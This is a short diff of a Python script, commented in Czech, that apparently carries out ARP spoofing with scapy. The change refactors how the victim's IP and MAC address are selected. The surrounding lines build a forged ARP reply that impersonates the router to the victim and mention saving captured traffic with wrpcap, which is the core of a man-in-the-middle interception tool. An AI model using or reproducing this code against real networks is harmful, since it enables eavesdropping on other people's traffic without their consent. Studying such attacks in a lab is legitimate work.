@@ -14,9 +14,11 @@
 #    - Použít wrpcap() k uložení nasbíraných dat.
 from scapy.all import ARP, wrpcap, send as s
 import time
-from network_utils import target_ip, target_mac, router_ip, router_mac
+from .network_utils import select_target, router_ip, router_mac
 
 # --- Config --- #
+
+target_ip, target_mac = select_target() 
 
 # Vytvoření falešného ARP paketu pro oběť
 arp_obet = ARP(op=2, psrc=router_ip, pdst=target_ip, hwdst=target_mac)
